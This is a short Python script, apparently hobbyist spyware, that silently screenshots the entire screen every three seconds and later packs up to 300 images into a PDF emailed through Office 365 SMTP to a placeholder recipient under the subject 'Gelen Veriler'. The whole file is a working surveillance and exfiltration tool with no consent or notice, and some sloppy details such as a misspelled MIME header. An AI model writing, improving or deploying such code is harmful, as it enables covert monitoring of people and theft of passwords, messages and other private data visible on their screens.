import os
import time
import datetime
import shutil
import urllib.request
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import smtplib
from PIL import ImageGrab,ImageOps,Image

make_file_path = os.path.dirname(os.getcwd())

def check(make_file_path):
    state = os.path.exists(make_file_path+"\\ss")
    if(state):
        if(check_net()):
            send_pdf(make_file_path)
            shutil.rmtree(f"{make_file_path}\\temp", ignore_errors=True)
        else:
            pass
        start_ss(make_file_path)
    else:
        os.makedirs(f"{make_file_path}\\ss",exist_ok= True)
        start_ss(make_file_path)
    
def start_ss(make_file_path):
    print("ss basladi")
    while True:
        x = datetime.datetime.now()
        y = x.strftime("%d_%m_%Y_%H_%M_%S_%f")
        sht = ImageOps.grayscale(ImageGrab.grab())
        sht.save(make_file_path+"\\ss\\ss{}.png".format(y))
        time.sleep(3)
        
def send_pdf(make_file_path):
    img_list = []
    for root,file,dirs in os.walk(f"{make_file_path}\ss"):
        img_list= [r"{}".format(f"{make_file_path}\ss"+"\\"+x) for x in dirs[0:300]]
    os.makedirs(f"{make_file_path}\\temp",exist_ok= True)
    for image in img_list:
        new_path = f"{make_file_path}\\temp"
        shutil.move(image, new_path)

        
    img_list = []
    path = f"{make_file_path}\\temp"
    for root,file,dirs in os.walk(path):
        img_list= [r"{}".format(path+"\\"+x) for x in dirs[0:300]]
    if(len(img_list)==0):
        start_ss(make_file_path)
    else:
        img = Image.open(img_list[0])
        img.save(f"{path}\images.pdf",save_all= True,append_images=[Image.open(i) for i in img_list[:300]])

        #if((os.stat(f"{path}\images.pdf").st_size)/(1024*1024)>25):
            #quit()
            
        message = MIMEMultipart()
        message["From"] = "sender email"
        message["To"] = "receiver email"
        message["Subject"] = "Gelen Veriler"


        binary_pdf = open(f"{path}\images.pdf", 'rb')
         
        payload = MIMEBase('application', 'octate-stream', Name="images.pdf")
        payload.set_payload((binary_pdf).read())
         
        
        encoders.encode_base64(payload)
         
       
        payload.add_header('Content-Decomposition', 'attachment', filename="images.pdf")
        message.attach(payload)
        
        mail = smtplib.SMTP("smtp.office365.com",)
        
        mail.ehlo()
        
        mail.starttls()
        
        mail.login("sender email","sender email password")
        
        mail.sendmail("sender email", "receiver email",message.as_string())
        
        mail.close()
                                            
def check_net():
    try:
        urllib.request.urlopen("http://google.com")
        return True
    except:
        return False
        
check(make_file_path)
    
